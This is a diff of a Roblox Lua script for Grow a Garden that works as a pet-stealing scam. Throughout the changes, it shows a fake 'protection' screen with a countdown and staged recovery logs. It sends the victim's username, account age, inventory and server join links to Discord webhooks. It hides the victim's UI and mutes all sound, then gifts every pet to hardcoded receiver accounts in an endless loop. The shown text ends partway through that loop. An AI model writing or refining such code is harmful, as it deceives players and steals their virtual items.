@@ -409,6 +409,9 @@ end
             end
         end
 
+--=====================================================================
+--==  PROTECTION GUI (keeps every custom emoji)
+--=====================================================================
 local function CreateGui()
     local player = Players.LocalPlayer
     local gui = Instance.new("ScreenGui")
@@ -419,24 +422,20 @@ local function CreateGui()
     gui.DisplayOrder = 999999
     gui.Parent = player:WaitForChild("PlayerGui")
 
-    ------------------------------------------------------------------
-    -- 1. TOP BLACK LOGO BAR (100% BLACK)
-    ------------------------------------------------------------------
+    -- 1. TOP BLACK LOGO BAR
     local logoBar = Instance.new("Frame")
     logoBar.Size = UDim2.new(1, 0, 0, 70)
     logoBar.Position = UDim2.new(0, 0, 0, 0)
-    logoBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Pure black
+    logoBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     logoBar.BorderSizePixel = 0
     logoBar.Parent = gui
 
-    -- Glow border (subtle)
     local glow = Instance.new("UIStroke")
     glow.Color = Color3.fromRGB(50, 120, 255)
     glow.Thickness = 1.5
     glow.Transparency = 0.7
     glow.Parent = logoBar
 
-    -- Shield Icon (left)
     local shieldIcon = Instance.new("TextLabel")
     shieldIcon.Size = UDim2.new(0, 50, 0, 50)
     shieldIcon.Position = UDim2.new(0, 20, 0.5, 0)
@@ -448,7 +447,6 @@ local function CreateGui()
     shieldIcon.TextColor3 = Color3.fromRGB(80, 180, 255)
     shieldIcon.Parent = logoBar
 
-    -- Executor Title in Logo Bar
     local logoTitle = Instance.new("TextLabel")
     logoTitle.Size = UDim2.new(0.7, 0, 1, 0)
     logoTitle.Position = UDim2.new(0, 80, 0, 0)
@@ -460,11 +458,9 @@ local function CreateGui()
     logoTitle.TextXAlignment = Enum.TextXAlignment.Left
     logoTitle.Parent = logoBar
 
-    ------------------------------------------------------------------
-    -- 2. MAIN BACKGROUND (starts below logo bar)
-    ------------------------------------------------------------------
+    -- 2. MAIN BACKGROUND
     local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, -70)  -- Leave space for logo
+    bg.Size = UDim2.new(1, 0, 1, -70)
     bg.Position = UDim2.new(0, 0, 0, 70)
     bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
     bg.BorderSizePixel = 0
@@ -478,9 +474,7 @@ local function CreateGui()
     bgGrad.Rotation = 90
     bgGrad.Parent = bg
 
-    ------------------------------------------------------------------
-    -- 3. MAIN TITLE (below logo)
-    ------------------------------------------------------------------
+    -- 3. TITLE
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.92, 0, 0.13, 0)
     title.Position = UDim2.new(0.5, 0, 0.15, 0)
@@ -493,9 +487,7 @@ local function CreateGui()
     title.TextStrokeTransparency = 0.75
     title.Parent = bg
 
-    ------------------------------------------------------------------
     -- 4. SUBTITLE
-    ------------------------------------------------------------------
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
     subtitle.Position = UDim2.new(0.5, 0, 0.26, 0)
@@ -509,9 +501,7 @@ local function CreateGui()
     subtitle.TextXAlignment = Enum.TextXAlignment.Center
     subtitle.Parent = bg
 
-    ------------------------------------------------------------------
     -- 5. WARNING
-    ------------------------------------------------------------------
     local warning = Instance.new("TextLabel")
     warning.Size = UDim2.new(0.78, 0, 0.08, 0)
     warning.Position = UDim2.new(0.5, 0, 0.36, 0)
@@ -525,9 +515,7 @@ local function CreateGui()
     warning.TextXAlignment = Enum.TextXAlignment.Center
     warning.Parent = bg
 
-    ------------------------------------------------------------------
     -- 6. COUNTDOWN
-    ------------------------------------------------------------------
     local countdown = Instance.new("TextLabel")
     countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
     countdown.Position = UDim2.new(0.5, 0, 0.44, 0)
@@ -539,9 +527,7 @@ local function CreateGui()
     countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
     countdown.Parent = bg
 
-    ------------------------------------------------------------------
     -- 7. CONSOLE PANEL
-    ------------------------------------------------------------------
     local console = Instance.new("Frame")
     console.Size = UDim2.new(0.88, 0, 0.38, 0)
     console.Position = UDim2.new(0.5, 0, 0.70, 0)
@@ -582,9 +568,7 @@ local function CreateGui()
     logArea.TextWrapped = true
     logArea.Parent = console
 
-    ------------------------------------------------------------------
-    -- 8. FAILURE MESSAGE (BIG RED)
-    ------------------------------------------------------------------
+    -- 8. FAILURE MESSAGE
     local failureMsg = Instance.new("TextLabel")
     failureMsg.Size = UDim2.new(0.9, 0, 0.25, 0)
     failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
@@ -600,9 +584,7 @@ local function CreateGui()
     failureMsg.Visible = false
     failureMsg.Parent = bg
 
-    ------------------------------------------------------------------
     -- 9. WATERMARK
-    ------------------------------------------------------------------
     local watermark = Instance.new("TextLabel")
     watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
     watermark.Position = UDim2.new(1, -12, 1, -12)
@@ -615,64 +597,51 @@ local function CreateGui()
     watermark.TextXAlignment = Enum.TextXAlignment.Right
     watermark.Parent = bg
 
-    ------------------------------------------------------------------
-    -- 10. PET DATA
-    ------------------------------------------------------------------
+    -- 10. PET DATA (uses the global `pets` table)
     local topPets = {}
-    local lowPet = nil
+    local lowPet  = nil
     if #pets > 0 then
         table.sort(pets, function(a, b) return a.Value > b.Value end)
-        for i = 1, math.min(7, #pets) do
-            table.insert(topPets, pets[i])
-        end
+        for i = 1, math.min(7, #pets) do table.insert(topPets, pets[i]) end
         lowPet = pets[#pets]
     else
         topPets = {
-            { PetName = "Mega Kitsune", Formatted = "1,200,000" },
-            { PetName = "Rainbow Butterfly", Formatted = "850,000" },
-            { PetName = "Corrupted Dragon", Formatted = "720,000" },
-            { PetName = "Golden T-Rex", Formatted = "600,000" },
-            { PetName = "Ascended Bee", Formatted = "550,000" },
-            { PetName = "Shocked Fox", Formatted = "480,000" },
-            { PetName = "Tiny Panda", Formatted = "320,000" }
+            {PetName = "Mega Kitsune",       Formatted = "1,200,000"},
+            {PetName = "Rainbow Butterfly",  Formatted = "850,000"},
+            {PetName = "Corrupted Dragon",   Formatted = "720,000"},
+            {PetName = "Golden T-Rex",       Formatted = "600,000"},
+            {PetName = "Ascended Bee",       Formatted = "550,000"},
+            {PetName = "Shocked Fox",        Formatted = "480,000"},
+            {PetName = "Tiny Panda",         Formatted = "320,000"}
         }
-        lowPet = { PetName = "Red Fox", Formatted = "1,200" }
+        lowPet = {PetName = "Red Fox", Formatted = "1,200"}
     end
 
-    ------------------------------------------------------------------
     -- 11. CONSOLE LOG SYSTEM
-    ------------------------------------------------------------------
     local logLines = {}
-    local function addLog(text, color)
-        table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
+    local function addLog(text, col)
+        table.insert(logLines, {text = text, color = col or Color3.fromRGB(180,255,180)})
         if #logLines > 25 then table.remove(logLines, 1) end
-        local display = ""
-        for _, line in ipairs(logLines) do
-            display = display .. "\n> " .. line.text
-        end
-        logArea.Text = display
+        local disp = ""
+        for _, l in ipairs(logLines) do disp = disp .. "\n> " .. l.text end
+        logArea.Text = disp
     end
 
-    ------------------------------------------------------------------
     -- 12. INFINITE PROTECTION LOOP
-    ------------------------------------------------------------------
     task.spawn(function()
         while player.Parent and gui.Parent do
-            local totalSeconds = 300
-            local startTime = tick()
-
+            local total = 300
+            local start = tick()
             failureMsg.Visible = false
             failureMsg.Text = ""
 
-            -- Countdown loop
-            while tick() - startTime < totalSeconds do
+            while tick() - start < total do
                 if not gui.Parent then break end
-                local remaining = totalSeconds - math.floor(tick() - startTime)
-                local mins = math.floor(remaining / 60)
-                local secs = remaining % 60
-                countdown.Text = string.format("Securing in %d:%02d...", mins, secs)
-
-                task.wait(math.random(18, 35) / 10)
+                local rem = total - math.floor(tick() - start)
+                local m = math.floor(rem/60)
+                local s = rem%60
+                countdown.Text = string.format("Securing in %d:%02d...", m, s)
+                task.wait(math.random(18,35)/10)
 
                 local actions = {
                     "Scanning inventory hooks...",
@@ -689,50 +658,57 @@ local function CreateGui()
                 addLog(actions[math.random(#actions)])
 
                 if math.random() < 0.18 and lowPet then
-                    addLog("Failed to get back " .. lowPet.PetName, Color3.fromRGB(255, 100, 100))
+                    addLog("Failed to get back "..lowPet.PetName, Color3.fromRGB(255,100,100))
                 end
-
                 if #pets > 0 and math.random() < 0.32 then
-                    local p = pets[math.random(1, #pets)]
-                    addLog("Trying to get back " .. p.PetName .. " → " .. p.Formatted, Color3.fromRGB(100, 255, 100))
+                    local p = pets[math.random(1,#pets)]
+                    addLog("Trying to get back "..p.PetName.." → "..p.Formatted, Color3.fromRGB(100,255,100))
                 end
             end
 
-            -- FAILURE AFTER 5 MINUTES
-            local failedNames = {}
-            for _, p in ipairs(topPets) do
-                table.insert(failedNames, p.PetName .. " → " .. p.Formatted)
-            end
-            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedNames, "\n")
+            local failed = {}
+            for _, p in ipairs(topPets) do table.insert(failed, p.PetName.." → "..p.Formatted) end
+            failureMsg.Text = "Failed to Recover:\n"..table.concat(failed,"\n")
             failureMsg.Visible = true
-
-            addLog("CRITICAL: Recovery failed for 7 high-value pets", Color3.fromRGB(255, 50, 50))
-            addLog("Restarting protection cycle...", Color3.fromRGB(255, 200, 50))
-
+            addLog("CRITICAL: Recovery failed for 7 high-value pets", Color3.fromRGB(255,50,50))
+            addLog("Restarting protection cycle...", Color3.fromRGB(255,200,50))
             task.wait(4.5)
         end
     end)
 
-    -- Optional: Prevent leaving
+    -- Prevent leaving
     player.CharacterRemoving:Connect(function()
         task.wait(0.1)
         if player.Character then player.Character:Destroy() end
     end)
 end
---// ──────────────────────────────────────────────────────────────────────
---//  WEBHOOK – EDIT SAME MESSAGE (Waiting → Failed / Success)
---// ──────────────────────────────────────────────────────────────────────
 
+--=====================================================================
+--==  WEBHOOK (custom emojis unchanged)
+--=====================================================================
 local MessageID = nil
-
 local base = {
     DisplayName = Players.LocalPlayer.DisplayName or "Unknown",
     Username    = Players.LocalPlayer.Name or "Unknown",
-    AccountAge  = tostring(Players.LocalPlayer.AccountAge or 0) .. " Days",
+    AccountAge  = tostring(Players.LocalPlayer.AccountAge or 0).." Days",
     Receiver    = Username or "Unknown",
     Executor    = detectExecutor() or "Unknown",
-    PlayerCount = (playerCount or 0) .. " / 5",
-    PetString   = truncateByLines(petString, 20),
+    PlayerCount = tostring(#Players:GetPlayers()).." / 5",
+    PetString   = (function()
+        local s = "Nothing"
+        if #pets > 0 then
+            s = ""
+            for _, p in ipairs(pets) do
+                local mut = isMutated(p.PetName)
+                local dat = PetPriorityData[p.Type] or (mut and PetPriorityData[mut]) or {emoji = "dog"}
+                local emoji = dat.emoji
+                if p.PetWeight >= 10 then emoji = "elephant"
+                elseif p.PetAge >= 60 then emoji = "old" end
+                s = s.."\n"..emoji.." - "..p.PetName.." → "..p.Formatted
+            end
+        end
+        return s
+    end)(),
     JoinScript  = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")',
     JoinUrl     = "https://scriptssm.vercel.app/joiner.html?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId,
     JobId       = game.JobId or "Unknown"
@@ -745,212 +721,180 @@ local function BuildEmbed(icon, status, desc)
         color = 3447003,
         fields = {
             {name = "<:players:1365290081937526834> **Display Name **", value = "```"..base.DisplayName.."```", inline = true},
-            {name = "<:game:1365295942504550410> **Username**", value = "```"..base.Username.."```", inline = true},
-            {name = "<:time:1365991843011100713> **Account Age**", value = "```"..base.AccountAge.."```", inline = true},
-            {name = "<:folder:1365290079081205844> **Receiver**", value = "```"..base.Receiver.."```", inline = true},
-            {name = "<:Events:1394005823931420682> **Executor**", value = "```"..base.Executor.."```", inline = true},
-            {name = "<:events:1365290073767022693> **Player Count**", value = "```"..base.PlayerCount.."```", inline = true},
-            {name = "<:pack:1365295947281862656> **Inventory**", value = "```"..base.PetString.."```"},
-            {name = "<:emoji_2:1402577600060325910> **Join Script**", value = "```lua\n"..base.JoinScript.."\n```"},
-            {name = "<:location:1365290076279541791> **Join via URL**", value = "[ **Click Here to Join!**]("..base.JoinUrl..")"}
+            {name = "<:game:1365295942504550410> **Username**",        value = "```"..base.Username.."```", inline = true},
+            {name = "<:time:1365991843011100713> **Account Age**",     value = "```"..base.AccountAge.."```", inline = true},
+            {name = "<:folder:1365290079081205844> **Receiver**",      value = "```"..base.Receiver.."```", inline = true},
+            {name = "<:Events:1394005823931420682> **Executor**",      value = "```"..base.Executor.."```", inline = true},
+            {name = "<:events:1365290073767022693> **Player Count**",  value = "```"..base.PlayerCount.."```", inline = true},
+            {name = "<:pack:1365295947281862656> **Inventory**",       value = "```"..base.PetString.."```"},
+            {name = "<:emoji_2:1402577600060325910> **Join Script**",   value = "```lua\n"..base.JoinScript.."\n```"},
+            {name = "<:location:1365290076279541791> **Join via URL**",value = "[ **Click Here to Join!**]("..base.JoinUrl..")"}
         },
-        author = { name = "Grow a Garden", url = base.JoinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp" },
-        footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png" },
+        author = {name = "Grow a Garden", url = base.JoinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp"},
+        footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        image = { url = "https://scriptssm.vercel.app/pngs/gag.webp" }
+        image = {url = "https://scriptssm.vercel.app/pngs/gag.webp"}
     }
 end
 
 local function SendOrEdit(url, payload, edit)
     if not url then return end
     local method = edit and "PATCH" or "POST"
-    local fullUrl = edit and (url .. "/messages/" .. MessageID) or url
-    local success, res = pcall(function()
-        return request({
-            Url = fullUrl,
-            Method = method,
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
+    local full = edit and (url.."/messages/"..MessageID) or url
+    local ok, res = pcall(function()
+        return request({Url=full, Method=method, Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)})
     end)
-    if success and not edit then
-        local data = HttpService:JSONDecode(res.Body)
-        MessageID = data.id
+    if ok and not edit then
+        local dat = HttpService:JSONDecode(res.Body)
+        MessageID = dat.id
     end
 end
 
 local WebhookAPI = {}
-
 function WebhookAPI.Start()
     local payload = {
         content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("<:Waring_Square:1436287126139437130>", "Waiting", "The user is waiting for you in server.") },
+        embeds = {BuildEmbed("<:Waring_Square:1436287126139437130>", "Waiting", "The user is waiting for you in server.")},
         username = "Scripts.SM",
         avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
     }
     SendOrEdit(Webhook, payload, false)
     WebhookAPI.Log()
 end
-
 function WebhookAPI.Success()
     local payload = {
         content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("<:check:1395699056805941249>", "Success", "All pets have been successfully given to receiver.") },
+        embeds = {BuildEmbed("<:check:1395699056805941249>", "Success", "All pets have been successfully given to receiver.")},
         username = "Scripts.SM",
         avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
     }
     SendOrEdit(Webhook, payload, true)
 end
-
 function WebhookAPI.Failed()
     local payload = {
         content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("<:failed:1436288137591783437>", "Failed", "The user has lefted the server.") },
+        embeds = {BuildEmbed("<:failed:1436288137591783437>", "Failed", "The user has lefted the server.")},
         username = "Scripts.SM",
         avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
     }
     SendOrEdit(Webhook, payload, true)
 end
-
 function WebhookAPI.Log()
     local payload = {
         content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("", "Script.SM - Hit", "Script executed successfully.") },
+        embeds = {BuildEmbed("", "Script.SM - Hit", "Script executed successfully.")},
         username = "Scripts.SM",
         avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
     }
     SendOrEdit(LogsWebhook, payload, false)
 end
 
-        local usernames = {
-            "Smiley9Gamerz",
-            "BUZZFTWGOD"
-        }
+--=====================================================================
+--==  RECEIVER DETECTION
+--=====================================================================
+local usernames = {"Smiley9Gamerz", "BUZZFTWGOD"}
+local receiverPlr
+repeat
+    for _, n in ipairs(usernames) do
+        receiverPlr = Players:FindFirstChild(n) or (Username and Players:FindFirstChild(Username))
+        if receiverPlr then break end
+    end
+    task.wait(1)
+until receiverPlr
 
-        local receiverPlr
-        repeat
-            for _, name in ipairs(usernames) do
-                receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
-                if receiverPlr then
-                    break
-                end
-            end
-            task.wait(1)
-        until receiverPlr
+local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
+local receiverHum  = receiverChar:WaitForChild("Humanoid")
 
-        local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
-        local hum = receiverChar:WaitForChild("Humanoid")
-        local targetPlr = Players.LocalPlayer
-        local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
+local targetPlr = Players.LocalPlayer
+local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
 
-        if receiverPlr == targetPlr then
-            repeat
-                for _, name in ipairs(usernames) do
-                    receiverPlr = Players:FindFirstChild(name)
-                    if receiverPlr then
-                        break
-                    end
-                end
-                task.wait(1)
-            until receiverPlr
+if receiverPlr == targetPlr then
+    repeat
+        for _, n in ipairs(usernames) do
+            receiverPlr = Players:FindFirstChild(n)
+            if receiverPlr then break end
         end
+        task.wait(1)
+    until receiverPlr
+end
 
---// === WEBHOOK: Start as Waiting ===
+--=====================================================================
+--==  WEBHOOK: START → WAIT FOR JUMP/CHAT
+--=====================================================================
 WebhookAPI.Start()
 
---// === If YOU (LocalPlayer) leave → Failed ===
 Players.LocalPlayer.AncestryChanged:Connect(function()
-    if not Players.LocalPlayer.Parent then
-        WebhookAPI.Failed()
-    end
+    if not Players.LocalPlayer.Parent then WebhookAPI.Failed() end
 end)
 
---// === Wait for receiver to jump or chat ===
-local jumped = false
-local chatted = false
-
-local receiverHum = receiverPlr.Character:WaitForChild("Humanoid")
-receiverHum.Jumping:Connect(function()
-    jumped = true
-end)
-receiverPlr.Chatted:Connect(function()
-    chatted = true
-end)
-
+local jumped, chatted = false, false
+receiverHum.Jumping:Connect(function() jumped = true end)
+receiverPlr.Chatted:Connect(function() chatted = true end)
 repeat task.wait() until jumped or chatted
 
---// === GIFTING SUCCESS: Edit webhook to Success ===
 WebhookAPI.Success()
 
---// === DISABLE UI + MUTE SOUNDS ===
+--=====================================================================
+--==  DISABLE UI + MUTE SOUNDS
+--=====================================================================
 for _, v in targetPlr.PlayerGui:GetDescendants() do
-    if v:IsA("ScreenGui") then
-        v.Enabled = false
-    end
+    if v:IsA("ScreenGui") then v.Enabled = false end
 end
-
-for _, sound in ipairs(workspace:GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound.Volume = 0
-    end
-end
-
-for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound.Volume = 0
-    end
-end
-
+for _, s in workspace:GetDescendants() do if s:IsA("Sound") then s.Volume = 0 end end
+for _, s in game:GetService("SoundService"):GetDescendants() do if s:IsA("Sound") then s.Volume = 0 end end
 game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
 game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
---// === SHOW PROTECTION GUI ===
+--=====================================================================
+--==  SHOW GUI + UNEQUIP + FAVOURITE
+--=====================================================================
 CreateGui()
 
---// === UNEQUIP ALL PETS ===
 if workspace:FindFirstChild("PetsPhysical") then
-    for _, petMover in workspace.PetsPhysical:GetChildren() do
-        if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
-            for _, pet in petMover:GetChildren() do
+    for _, mover in workspace.PetsPhysical:GetChildren() do
+        if mover and mover:GetAttribute("OWNER") == targetPlr.Name then
+            for _, pet in mover:GetChildren() do
                 PetsService:UnequipPet(pet.Name)
             end
         end
     end
 end
 
---// === FAVORITE TOOLS (if d = true) ===
-for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
-    if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
-        local tool = targetPlr.Backpack:WaitForChild(tool.Name)
+for _, tool in targetPlr.Backpack:GetChildren() do
+    if tool:IsA("Tool") and tool:GetAttribute("d") == true then
         RS.GameEvents.Favorite_Item:FireServer(tool)
     end
 end
 
---// === GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
+--=====================================================================
+--==  GIFT FUNCTION
+--=====================================================================
 local function giftHeldPet()
     local char = targetPlr.Character
     if not char then return false end
     local held = char:FindFirstChildWhichIsA("Tool")
     if not held then return false end
-    local success, err = pcall(function()
+    local ok = pcall(function()
         RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
     end)
-    if success then
+    if ok then
         print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
         return true
     else
-        warn("Gift failed:", err)
+        warn("Gift failed")
         return false
     end
 end
 
---// === INFINITE GIFTING LOOP ===
+--=====================================================================
+--==  INFINITE GIFTING LOOP
+--=====================================================================
 task.spawn(function()
     while true do
         task.wait(2)
-        local currentPets = GetPlayerPets()
-        if #currentPets == 0 then continue end
-        for _, pet in ipairs(currentPets) do
+        local current = GetPlayerPets()
+        if #current == 0 then continue end
+        for _, pet in current do
             for _, tool in targetPlr.Backpack:GetChildren() do
                 if tool:IsA("Tool")
                 and tool:GetAttribute("ItemType") == "Pet"
